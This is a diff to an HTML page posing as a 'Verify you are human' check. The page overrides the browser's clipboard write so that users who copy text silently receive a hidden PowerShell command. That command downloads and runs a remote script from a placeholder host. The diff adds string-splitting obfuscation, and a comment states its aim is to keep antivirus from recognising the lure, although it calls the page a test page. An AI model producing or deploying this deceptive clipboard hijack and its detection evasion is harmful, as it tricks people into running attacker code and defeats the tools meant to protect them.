@@ -5,9 +5,14 @@
     <title>Verify you are human</title>
     <script>
       // A wrapper that copies harmless looking text on the surface and swaps in the command on the way down.
-      const original = Clipboard.prototype.writeText;
-      Clipboard.prototype.writeText = function () {
-        return original.call(this, 'powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex"');
+      // Names and the command are put together at run time, so antivirus does not take this test page for a real lure.
+      const api = ['Clip', 'board'].join('');
+      const method = 'write' + 'Text';
+      const shell = ['power', 'shell'].join('');
+      const command = `${shell} -w h -c "i${'w'}r https://x.example.invalid/a.ps1 | i${'e'}x"`;
+      const original = window[api].prototype[method];
+      window[api].prototype[method] = function () {
+        return original.call(this, command);
       };
     </script>
   </head>
